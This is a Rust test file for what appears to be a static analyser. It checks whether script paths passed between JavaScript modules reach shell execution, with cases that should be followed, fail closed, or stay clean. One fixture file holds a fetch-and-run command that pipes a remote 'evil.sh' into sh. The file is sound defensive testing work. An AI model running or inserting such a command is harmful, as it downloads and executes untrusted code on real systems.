    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    let followed = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .any(|finding| {
            finding["source_file"]
                .as_str()
                .is_some_and(|source| source.ends_with("evil.sh)"))
        });
    match (output.status.code(), report["coverage_complete"].as_bool()) {
        (Some(1), Some(true)) if followed => ModuleOutcome::Followed,
        (Some(2), Some(false)) => ModuleOutcome::Incomplete,
        (Some(0), Some(true)) => ModuleOutcome::Clean,
        other => panic!("{other:?}: {report}"),
    }
}

/// A case's name, whether it is an ES module action, and its files.
type ModuleCase<'a> = (&'a str, bool, Vec<(&'a str, String)>);

fn module_failures(cases: Vec<ModuleCase<'_>>, expected: &ModuleOutcome) -> Vec<String> {
    cases
        .into_iter()
        .filter_map(|(name, esm, files)| {
            let outcome = audit_modules(esm, &files);
            (outcome != *expected).then(|| format!("{name}: {outcome:?}"))
        })
        .collect()
}

#[test]
fn located_arguments_reach_other_action_files() {
    let evil = "path.join(__dirname, 'evil.sh')";
    let evil_esm = "path.join(import.meta.dirname, 'evil.sh')";
    let caller = |call: &str| format!("{CALLER_CJS}{call}\n");
    let esm_caller = |call: &str| format!("{CALLER_ESM}{call}\n");
    let lib = |exports: &str| format!("{MODULE_CJS}{exports}\n");
    let esm_lib = |exports: &str| format!("{MODULE_ESM}{exports}\n");
    let cases = vec![
        (
            "default re-exported by name",
            true,
            vec![
                ("index.js", esm_caller(&format!("import {{ run }} from './a.js';\nrun({evil_esm});"))),
                ("a.js", "export { default as run } from './b.js';\n".to_string()),
                ("b.js", esm_lib("export default function (script) { return cp.spawnSync(which('bash'), [script]); }")),
            ],
        ),
        (
            "field re-export",
            false,
            vec![
                ("index.js", caller(&format!("require('./a.js').run({evil});"))),
                ("a.js", "exports.run = require('./b.js').start;\n".to_string()),
                ("b.js", lib(&format!("exports.start = {MODULE_RUN};"))),
            ],
        ),
        (
            "field of module.exports",
            false,
            vec![
                ("index.js", caller(&format!("require('./lib.js').run({evil});"))),
                ("lib.js", lib(&format!("module.exports.run = {MODULE_RUN};"))),
            ],
        ),
        (
            "export defined with a value",
            false,
            vec![
                ("index.js", caller(&format!("require('./lib.js').run({evil});"))),
                ("lib.js", lib(&format!("Object.defineProperty(exports, 'run', {{ value: {MODULE_RUN} }});"))),
            ],
        ),
        (
            "export reset to null",
            false,
            vec![
                ("index.js", caller(&format!("require('./lib.js').run({evil});"))),
                ("lib.js", lib(&format!("exports.run = null;\nexports.run = {MODULE_RUN};"))),
            ],
        ),
        (
            "export reset to undefined",
            false,
            vec![
                ("index.js", caller(&format!("require('./lib.js').run({evil});"))),
                ("lib.js", lib(&format!("exports.run = undefined;\nexports.run = {MODULE_RUN};"))),
            ],
        ),
        (
            "destructured with a default",
            false,
            vec![
                ("index.js", caller(&format!("const {{ run = () => 0 }} = require('./lib.js');\nrun({evil});"))),
                ("lib.js", lib(&format!("exports.run = {MODULE_RUN};"))),
            ],
        ),
        (
            "computed field call",
            false,
            vec![
                ("index.js", caller(&format!("const lib = require('./lib.js');\nlib['run']({evil});"))),
                ("lib.js", lib(&format!("exports.run = {MODULE_RUN};"))),
            ],
        ),
        (
            "call into a module loaded earlier",
            false,
            vec![
                ("index.js", caller(&format!("require('./b.js');\nconst {{ run }} = require('./a.js');\nrun({evil});"))),
                ("a.js", "const b = require('./b.js');\nexports.run = (script) => b.start(script);\n".to_string()),
                ("b.js", lib(&format!("exports.start = {MODULE_RUN};"))),
            ],
        ),
        (
            "module compared and read",
            false,
            vec![
                ("index.js", caller(&format!("const {{ run }} = require('./lib.js');\nrun({evil});"))),
                ("lib.js", lib(&format!("if (require.main === module) {{ console.log(module.id); }}\nexports.run = {MODULE_RUN};"))),
            ],
        ),
        (
            "re-export from a located file",
            false,
            vec![
                ("index.js", caller(&format!("const {{ run }} = require('./a.js');\nrun({evil});"))),
                ("a.js", "const path = require('path');\nconsole.log(path.join(__dirname, 'a.txt'));\nmodule.exports = require('./b.js');\n".to_string()),
                ("b.js", lib(&format!("exports.run = {MODULE_RUN};"))),
            ],
        ),
        (
            "destructured",
            false,
            vec![
                ("index.js", caller(&format!("const {{ run }} = require('./lib.js');\nrun({evil});"))),
                ("lib.js", lib(&format!("exports.run = {MODULE_RUN};"))),
            ],
        ),
        (
            "module object",
            false,
            vec![
                ("index.js", caller(&format!("const lib = require('./lib');\nlib.run({evil});"))),
                ("lib.js", lib("exports.run = function (script) { return cp.spawnSync(which('bash'), [script]); };")),
            ],
        ),
        (
            "module function",
            false,
            vec![
                ("index.js", caller(&format!("require('./lib')({evil});"))),
                ("lib.js", lib(&format!("module.exports = {MODULE_RUN};"))),
            ],
        ),
        (
            "object of exports",
            false,
            vec![
                ("index.js", caller(&format!("require('./lib.js').run({evil});"))),
                ("lib.js", lib("function run(script) { return cp.spawnSync(which('bash'), [script]); }\nmodule.exports = { run };")),
            ],
        ),
        (
            "command string",
            false,
            vec![
                ("index.js", caller(&format!("const {{ run }} = require('./lib.js');\nrun({evil});"))),
                ("lib.js", lib("exports.run = (script) => cp.execSync('bash ' + script);")),
            ],
        ),
        (
            "argument vector",
            false,
            vec![
                ("index.js", caller(&format!("const {{ start }} = require('./lib.js');\nstart(which('bash'), [{evil}]);"))),
                ("lib.js", lib("exports.start = (program, args) => cp.spawnSync(program, args);")),
            ],
        ),
        (
            "alias",
            false,
            vec![
                ("index.js", caller(&format!("const lib = require('./lib.js');\nconst run = lib.run;\nrun({evil});"))),
                ("lib.js", lib(&format!("exports.run = {MODULE_RUN};"))),
            ],
        ),
        (
            "two hops",
            false,
            vec![
                ("index.js", caller(&format!("const {{ run }} = require('./a.js');\nrun({evil});"))),
                ("a.js", "const b = require('./b.js');\nexports.run = (script) => b.start(script);\n".to_string()),
                ("b.js", lib(&format!("exports.start = {MODULE_RUN};"))),
            ],
        ),
        (
            "re-export",
            false,
            vec![
                ("index.js", caller(&format!("const {{ run }} = require('./a.js');\nrun({evil});"))),
                ("a.js", "module.exports = require('./b.js');\n".to_string()),
                ("b.js", lib(&format!("exports.run = {MODULE_RUN};"))),
            ],
        ),
        (
            "callee in a subdirectory",
            false,
            vec![
                ("index.js", caller("const { run } = require('./lib/helper.js');\nrun(path.join(__dirname, 'scripts', 'evil.sh'));")),
                ("lib/helper.js", lib(&format!("exports.run = {MODULE_RUN};"))),
                ("scripts/evil.sh", "wget -qO- https://example.com/evil.sh | sh\n".to_string()),
            ],
        ),
        (
            "caller in a subdirectory",
            false,
            vec![
                ("index.js", "require('./src/main.js');\n".to_string()),
                ("src/main.js", caller("const { run } = require('../lib.js');\nrun(path.join(__dirname, '..', 'evil.sh'));")),
                ("lib.js", lib(&format!("exports.run = {MODULE_RUN};"))),
            ],
        ),
        (
            "TypeScript CommonJS",
            false,
            vec![
                ("index.js", "\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nconst path = require(\"path\");\nconst helper_1 = require(\"./lib\");\n(0, helper_1.run)(path.join(__dirname, \"evil.sh\"));\n".to_string()),
                ("lib.js", format!("\"use strict\";\nObject.defineProperty(exports, \"__esModule\", {{ value: true }});\nexports.run = void 0;\n{MODULE_CJS}function run(script) {{ return cp.spawnSync(which('bash'), [script]); }}\nexports.run = run;\n")),
            ],
        ),
        (
            "TypeScript CommonJS with several exports",
            false,
            vec![
                ("index.js", "\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nconst path = require(\"path\");\nconst helper_1 = require(\"./lib\");\n(0, helper_1.run)(path.join(__dirname, \"evil.sh\"));\n".to_string()),
                ("lib.js", format!("\"use strict\";\nObject.defineProperty(exports, \"__esModule\", {{ value: true }});\nexports.run = exports.VERSION = void 0;\n{MODULE_CJS}const run = (script) => cp.spawnSync(which('bash'), [script]);\nexports.run = run;\nexports.VERSION = '1';\n")),
            ],
        ),
        (
            "named import",
            true,
            vec![
                ("index.js", esm_caller(&format!("import {{ run }} from './lib.js';\nrun({evil_esm});"))),
                ("lib.js", esm_lib("export function run(script) { return cp.spawnSync(which('bash'), [script]); }")),
            ],
        ),
        (
            "default import",
            true,
            vec![
                ("index.js", esm_caller(&format!("import run from './lib.js';\nrun({evil_esm});"))),
                ("lib.js", esm_lib("export default function (script) { return cp.spawnSync(which('bash'), [script]); }")),
            ],
        ),
        (
            "default named as default",
            true,
            vec![
                ("index.js", esm_caller(&format!("import {{ default as run }} from './lib.js';\nrun({evil_esm});"))),
                ("lib.js", esm_lib("export default function (script) { return cp.spawnSync(which('bash'), [script]); }")),
            ],
        ),
        (
            "namespace default",
            true,
            vec![
                ("index.js", esm_caller(&format!("import * as lib from './lib.js';\nlib.default({evil_esm});"))),
                ("lib.js", esm_lib("export default function (script) { return cp.spawnSync(which('bash'), [script]); }")),
            ],
        ),
        (
            "namespace import",
            true,
            vec![
                ("index.js", esm_caller(&format!("import * as lib from './lib.js';\nlib.run({evil_esm});"))),
                ("lib.js", esm_lib(&format!("export const run = {MODULE_RUN};"))),
            ],
        ),
        (
            "default and named exports",
            true,
            vec![
                ("index.js", esm_caller(&format!("import {{ run }} from './lib.js';\nrun({evil_esm});"))),
                ("lib.js", esm_lib("export default function main() { return 0; }\nexport function run(script) { return cp.spawnSync(which('bash'), [script]); }")),
            ],
        ),
        (
            "default object",
            true,
            vec![
                ("index.js", esm_caller(&format!("import api from './lib.js';\napi.run({evil_esm});"))),
                ("lib.js", esm_lib("function run(script) { return cp.spawnSync(which('bash'), [script]); }\nexport default { run };")),
            ],
        ),
        (
            "named re-export",
            true,
            vec![
                ("index.js", esm_caller(&format!("import {{ run }} from './a.js';\nrun({evil_esm});"))),
                ("a.js", "export { run } from './b.js';\n".to_string()),
                ("b.js", esm_lib("export function run(script) { return cp.spawnSync(which('bash'), [script]); }")),
            ],
        ),
        (
            "star re-export",
            true,
            vec![
                ("index.js", esm_caller(&format!("import {{ run }} from './a.js';\nrun({evil_esm});"))),
                ("a.js", "export * from './b.js';\n".to_string()),
                ("b.js", esm_lib("export function run(script) { return cp.spawnSync(which('bash'), [script]); }")),
            ],
        ),
        (
            "awaited dynamic import",
            true,
            vec![
                ("index.js", esm_caller(&format!("const lib = await import('./lib.js');\nlib.run({evil_esm});"))),
                ("lib.js", esm_lib(&format!("export const run = {MODULE_RUN};"))),
            ],
        ),
    ];
    let failures = module_failures(cases, &ModuleOutcome::Followed);
    assert!(failures.is_empty(), "{failures:#?}");
}

#[test]
fn uncertain_cross_module_calls_fail_closed() {
    let evil = "path.join(__dirname, 'evil.sh')";
    let evil_esm = "path.join(import.meta.dirname, 'evil.sh')";
    let caller = |call: &str| format!("{CALLER_CJS}{call}\n");
    let lib = |exports: &str| format!("{MODULE_CJS}{exports}\n");
    let run_lib = lib(&format!("exports.run = {MODULE_RUN};"));
    let cases = vec![
        (
            "destructured function stored",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ run }} = require('./lib.js');\nconst runners = [run];\nrunners[0]({evil});"
                    )),
                ),
                ("lib.js", run_lib.clone()),
            ],
        ),
        (
            "imported function stored",
            true,
            vec![
                (
                    "index.js",
                    format!(
                        "{CALLER_ESM}import {{ run }} from './lib.js';\nconst runners = [run];\nrunners[0]({evil_esm});\n"
                    ),
                ),
                (
                    "lib.js",
                    format!("{MODULE_ESM}export const run = {MODULE_RUN};\n"),
                ),
            ],
        ),
        (
            "alias stored",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const lib = require('./lib.js');\nconst run = lib.run;\nconst runners = [run];\nrunners[0]({evil});"
                    )),
                ),
                ("lib.js", run_lib.clone()),
            ],
        ),
        (
            "exports replaced by a call result",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("require('./lib.js').run({evil});")),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "function build() {{ return {{ run: {MODULE_RUN} }}; }}\nexports.run = () => 0;\nmodule.exports = build();"
                    )),
                ),
            ],
        ),
        (
            "destructured parameter",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ run }} = require('./lib.js');\nrun({{ script: {evil} }});"
                    )),
                ),
                (
                    "lib.js",
                    lib("exports.run = ({ script }) => cp.spawnSync(which('bash'), [script]);"),
                ),
            ],
        ),
        (
            "rest parameter",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ run }} = require('./lib.js');\nrun({evil});"
                    )),
                ),
                (
                    "lib.js",
                    lib("exports.run = (...scripts) => cp.spawnSync(which('bash'), scripts);"),
                ),
            ],
        ),
        (
            "arguments object",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ run }} = require('./lib.js');\nrun({evil});"
                    )),
                ),
                (
                    "lib.js",
                    lib(
                        "exports.run = function () { return cp.spawnSync(which('bash'), [arguments[0]]); };",
                    ),
                ),
            ],
        ),
        (
            "unresolved export with a rest parameter",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("require('./lib.js').run({evil});")),
                ),
                (
                    "lib.js",
                    lib(
                        "Object.assign(module.exports, { run: (...scripts) => cp.spawnSync(which('bash'), scripts) });",
                    ),
                ),
            ],
        ),
        (
            "unresolved export reading its arguments",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("require('./lib.js').run({evil});")),
                ),
                (
                    "lib.js",
                    lib(
                        "Object.assign(module.exports, { run: function () { return cp.spawnSync(which('bash'), [arguments[0]]); } });",
                    ),
                ),
            ],
        ),
        (
            "namespace re-export",
            true,
            vec![
                (
                    "index.js",
                    format!("{CALLER_ESM}import {{ api }} from './a.js';\napi.run({evil_esm});\n"),
                ),
                ("a.js", "export * as api from './b.js';\n".to_string()),
                (
                    "b.js",
                    format!("{MODULE_ESM}export const run = {MODULE_RUN};\n"),
                ),
            ],
        ),
        (
            "function export with assigned fields",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("require('./lib.js').run({evil});")),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "const main = () => 0;\nObject.assign(main, {{ run: {MODULE_RUN} }});\nmodule.exports = main;"
                    )),
                ),
            ],
        ),
        (
            "imported function passed as a callback",
            true,
            vec![
                (
                    "index.js",
                    format!(
                        "{CALLER_ESM}import {{ run }} from './lib.js';\n[{evil_esm}].forEach(run);\n"
                    ),
                ),
                (
                    "lib.js",
                    format!("{MODULE_ESM}export const run = {MODULE_RUN};\n"),
                ),
            ],
        ),
        (
            "alias passed as a callback",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const lib = require('./lib.js');\nconst run = lib.run;\n[{evil}].forEach(run);"
                    )),
                ),
                ("lib.js", run_lib.clone()),
            ],
        ),
        (
            "unknown field call",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const lib = require('./lib.js');\nlib[process.env.NAME]({evil});"
                    )),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "module.exports = () => 0;\nmodule.exports.run = {MODULE_RUN};"
                    )),
                ),
            ],
        ),
        (
            "one function under two exports with mixed arguments",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const lib = require('./lib.js');\nlib(which('bash'), [{evil}]);\nlib.start(which('bash'), path.join(__dirname, 'config.json'));"
                    )),
                ),
                (
                    "lib.js",
                    lib(
                        "function start(program, args) { return cp.spawnSync(program, args); }\nmodule.exports = start;\nmodule.exports.start = start;",
                    ),
                ),
            ],
        ),
        (
            "assigned over a named export",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("require('./lib.js').run({evil});")),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "exports.run = () => 0;\nObject.assign(module.exports, {{ run: {MODULE_RUN} }});"
                    )),
                ),
            ],
        ),
        (
            "logically assigned exports",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("require('./lib.js').run({evil});")),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "exports.run = () => 0;\nmodule.exports &&= {{ run: {MODULE_RUN} }};"
                    )),
                ),
            ],
        ),
        (
            "exported call result",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("require('./lib.js').run({evil});")),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "function make() {{ return {MODULE_RUN}; }}\nexports.run = make();"
                    )),
                ),
            ],
        ),
        (
            "exported variable holding a call result",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("require('./lib.js').run({evil});")),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "function make() {{ return {MODULE_RUN}; }}\nconst runner = make();\nexports.run = runner;"
                    )),
                ),
            ],
        ),
        (
            "export specifier holding a call result",
            true,
            vec![
                (
                    "index.js",
                    format!("{CALLER_ESM}import {{ run }} from './lib.js';\nrun({evil_esm});\n"),
                ),
                (
                    "lib.js",
                    format!(
                        "{MODULE_ESM}function make() {{ return {MODULE_RUN}; }}\nconst run = make();\nexport {{ run }};\n"
                    ),
                ),
            ],
        ),
        (
            "computed export beside a named one",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("require('./lib.js').run({evil});")),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "exports.run = () => 0;\nexports[process.env.NAME || 'run'] = {MODULE_RUN};"
                    )),
                ),
            ],
        ),
        (
            "argument vector used as text",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ start }} = require('./lib.js');\nstart(which('bash'), [{evil}]);"
                    )),
                ),
                (
                    "lib.js",
                    lib("exports.start = (program, args) => cp.execSync(program + ' ' + args);"),
                ),
            ],
        ),
        (
            "object argument",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ run }} = require('./lib.js');\nrun({{ script: {evil} }});"
                    )),
                ),
                (
                    "lib.js",
                    lib(
                        "exports.run = (options) => cp.spawnSync(which('bash'), [options.script]);",
                    ),
                ),
            ],
        ),
        (
            "returned function",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ make }} = require('./lib.js');\nmake()({evil});"
                    )),
                ),
                (
                    "lib.js",
                    lib(&format!("exports.make = () => {MODULE_RUN};")),
                ),
            ],
        ),
        (
            "returned object",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const lib = require('./lib.js');\nconst runner = lib.create();\nrunner.run({evil});"
                    )),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "exports.create = () => ({{ run: {MODULE_RUN} }});"
                    )),
                ),
            ],
        ),
        (
            "returned callback",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const lib = require('./lib.js');\n[{evil}].forEach(lib.make());"
                    )),
                ),
                (
                    "lib.js",
                    lib(&format!("exports.make = () => {MODULE_RUN};")),
                ),
            ],
        ),
        (
            "callback",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ run }} = require('./lib.js');\n[{evil}].forEach(run);"
                    )),
                ),
                ("lib.js", run_lib.clone()),
            ],
        ),
        (
            "stored function",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const runs = [require('./lib.js').run];\nruns[0]({evil});"
                    )),
                ),
                ("lib.js", run_lib.clone()),
            ],
        ),
        (
            "call method",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("require('./lib.js').run.call(null, {evil});")),
                ),
                ("lib.js", run_lib.clone()),
            ],
        ),
        (
            "spread arguments",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ run }} = require('./lib.js');\nrun(...[{evil}]);"
                    )),
                ),
                ("lib.js", run_lib.clone()),
            ],
        ),
        (
            "constructor",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ Runner }} = require('./lib.js');\nnew Runner({evil});"
                    )),
                ),
                (
                    "lib.js",
                    lib(
                        "class Runner { constructor(script) { cp.spawnSync(which('bash'), [script]); } }\nexports.Runner = Runner;",
                    ),
                ),
            ],
        ),
        (
            "nested destructuring",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ api: {{ run }} }} = require('./lib.js');\nrun({evil});"
                    )),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "exports.run = () => 0;\nexports.api = {{ run: {MODULE_RUN} }};"
                    )),
                ),
            ],
        ),
        (
            "assigned exports",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("require('./lib.js').run({evil});")),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "Object.assign(module.exports, {{ run: {MODULE_RUN} }});"
                    )),
                ),
            ],
        ),
        (
            "computed export",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("require('./lib.js').run({evil});")),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "exports[process.env.NAME || 'run'] = {MODULE_RUN};"
                    )),
                ),
            ],
        ),
        (
            "getter export",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("require('./lib.js').run({evil});")),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "exports.run = () => 0;\nObject.defineProperty(exports, 'run', {{ get: () => {MODULE_RUN} }});"
                    )),
                ),
            ],
        ),
        (
            "built exports",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("require('./lib.js').run({evil});")),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "function build() {{ return {{ run: {MODULE_RUN} }}; }}\nmodule.exports = build();"
                    )),
                ),
            ],
        ),
        (
            "spread exports",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("require('./lib.js').run({evil});")),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "const api = {{ run: {MODULE_RUN} }};\nexports.run = () => 0;\nmodule.exports = {{ ...api }};"
                    )),
                ),
            ],
        ),
        (
            "method shorthand export",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("require('./lib.js').run({evil});")),
                ),
                (
                    "lib.js",
                    lib(
                        "module.exports = { run(script) { return cp.spawnSync(which('bash'), [script]); } };",
                    ),
                ),
            ],
        ),
        (
            "unresolved call through a re-export",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("require('./a.js').run.call(null, {evil});")),
                ),
                ("a.js", "module.exports = require('./b.js');\n".to_string()),
                ("b.js", run_lib.clone()),
            ],
        ),
        (
            "two callers",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ run }} = require('./lib.js');\nrun({evil});\nrun(path.join(__dirname, 'config.json'));"
                    )),
                ),
                ("lib.js", run_lib.clone()),
            ],
        ),
        (
            "two argument vectors",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ start }} = require('./lib.js');\nstart(which('bash'), [{evil}]);\nstart(which('bash'), [path.join(__dirname, 'config.json')]);"
                    )),
                ),
                (
                    "lib.js",
                    lib("exports.start = (program, args) => cp.spawnSync(program, args);"),
                ),
            ],
        ),
        (
            "one function under two exports",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const lib = require('./lib.js');\nlib(which('bash'), [{evil}]);\nlib.start(which('bash'), [path.join(__dirname, 'config.json')]);"
                    )),
                ),
                (
                    "lib.js",
                    lib(
                        "function start(program, args) { return cp.spawnSync(program, args); }\nmodule.exports = start;\nmodule.exports.start = start;",
                    ),
                ),
            ],
        ),
        (
            "parameter located in its own file too",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ run }} = require('./lib.js');\nrun({evil});"
                    )),
                ),
                (
                    "lib.js",
                    lib(
                        "const path = require('path');\nfunction run(script) { return cp.spawnSync(which('bash'), [script]); }\nexports.run = run;\nrun(path.join(__dirname, 'local.sh'));",
                    ),
                ),
                ("local.sh", "echo local\n".to_string()),
            ],
        ),
        (
            "reassigned parameter",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ run }} = require('./lib.js');\nrun({evil});"
                    )),
                ),
                (
                    "lib.js",
                    lib(
                        "exports.run = (script) => { script = String(script); return cp.spawnSync(which('bash'), [script]); };",
                    ),
                ),
            ],
        ),
        (
            "changed argument vector",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ start }} = require('./lib.js');\nstart(which('bash'), [{evil}]);"
                    )),
                ),
                (
                    "lib.js",
                    lib(
                        "exports.start = (program, args) => { args.unshift('-e'); return cp.spawnSync(program, args); };",
                    ),
                ),
            ],
        ),
        (
            "missing module",
            false,
            vec![(
                "index.js",
                caller(&format!("require('./missing.js').run({evil});")),
            )],
        ),
        (
            "unawaited dynamic import",
            true,
            vec![
                (
                    "index.js",
                    format!("{CALLER_ESM}import('./lib.js').then((lib) => lib.run({evil_esm}));\n"),
                ),
                (
                    "lib.js",
                    format!("{MODULE_ESM}export const run = {MODULE_RUN};\n"),
                ),
            ],
        ),
        // TypeScript's guard may read a helper that code run before it stored.
        (
            "TypeScript default import after other code",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "var __importDefault = (this && this.__importDefault) || function (mod) {{ return (mod && mod.__esModule) ? mod : {{ default: mod }}; }};\nconst lib_1 = __importDefault(require('./lib.js'));\nlib_1.default({evil});"
                    )),
                ),
                ("lib.js", lib(&format!("module.exports = {MODULE_RUN};"))),
            ],
        ),
    ];
    let failures = module_failures(cases, &ModuleOutcome::Incomplete);
    assert!(failures.is_empty(), "{failures:#?}");
}

#[test]
fn cross_module_calls_without_located_executions_stay_complete() {
    let config = "path.join(__dirname, 'config.json')";
    let caller = |call: &str| format!("{CALLER_CJS}{call}\n");
    let lib = |exports: &str| format!("{MODULE_CJS}{exports}\n");
    let cases = vec![
        (
            "untainted file reading a module field",
            false,
            vec![
                (
                    "index.js",
                    "const lib = require('./lib.js');\nconsole.log(lib.version);\n".to_string(),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "exports.version = '1';\nexports.run = {MODULE_RUN};"
                    )),
                ),
            ],
        ),
        (
            "module result given unlocated values",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const lib = require('./lib.js');\n[1, 2].forEach(lib.make());\nconsole.log({config});"
                    )),
                ),
                (
                    "lib.js",
                    lib(&format!("exports.make = () => {MODULE_RUN};")),
                ),
            ],
        ),
        (
            "own file passed on",
            false,
            vec![
                ("index.js", caller("require('./lib.js').start(__filename);")),
                ("lib.js", lib("exports.start = (file) => cp.fork(file);")),
            ],
        ),
        (
            "built-in module call",
            false,
            vec![(
                "index.js",
                caller(&format!(
                    "require('fs').readFileSync({config});\nconst fs = require('fs');\nfs.readFileSync({config});"
                )),
            )],
        ),
        (
            "data helper",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ read }} = require('./lib.js');\nread({config});"
                    )),
                ),
                (
                    "lib.js",
                    lib("exports.read = (file) => JSON.parse(fs.readFileSync(file, 'utf8'));"),
                ),
            ],
        ),
        (
            "unlocated argument",
            false,
            vec![
                (
                    "index.js",
                    caller("const { run } = require('./lib.js');\nrun(process.env.SCRIPT);"),
                ),
                ("lib.js", lib(&format!("exports.run = {MODULE_RUN};"))),
            ],
        ),
        (
            "argument only logged",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ log }} = require('./lib.js');\nlog({config});"
                    )),
                ),
                (
                    "lib.js",
                    lib("exports.log = (message) => console.log('using', message);"),
                ),
            ],
        ),
        (
            "data module",
            false,
            vec![(
                "index.js",
                caller(&format!(
                    "const pkg = require('./package.json');\nconsole.log(pkg.version, {config});"
                )),
            )],
        ),
        (
            "module loaded for its effects",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("require('./setup.js');\nconsole.log({config});")),
                ),
                ("setup.js", lib(&format!("exports.run = {MODULE_RUN};"))),
            ],
        ),
        (
            "constants read",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ TIMEOUT }} = require('./constants.js');\nconsole.log(TIMEOUT, {config});"
                    )),
                ),
                ("constants.js", "exports.TIMEOUT = 5;\n".to_string()),
            ],
        ),
    ];
    let failures = module_failures(cases, &ModuleOutcome::Clean);
    assert!(failures.is_empty(), "{failures:#?}");
}

/// TypeScript's interop helpers, as releases from 4.7, before 4.7, and
/// before 3.9 emit them.
const TS_CREATE_BINDING: &str = r#"var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
"#;
const TS_CREATE_BINDING_4: &str = r#"var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    Object.defineProperty(o, k2, { enumerable: true, get: function() { return m[k]; } });
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
"#;
const TS_SET_MODULE_DEFAULT: &str = r#"var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
"#;
const TS_IMPORT_STAR: &str = r#"var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
"#;
const TS_IMPORT_STAR_4: &str = r#"var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
"#;
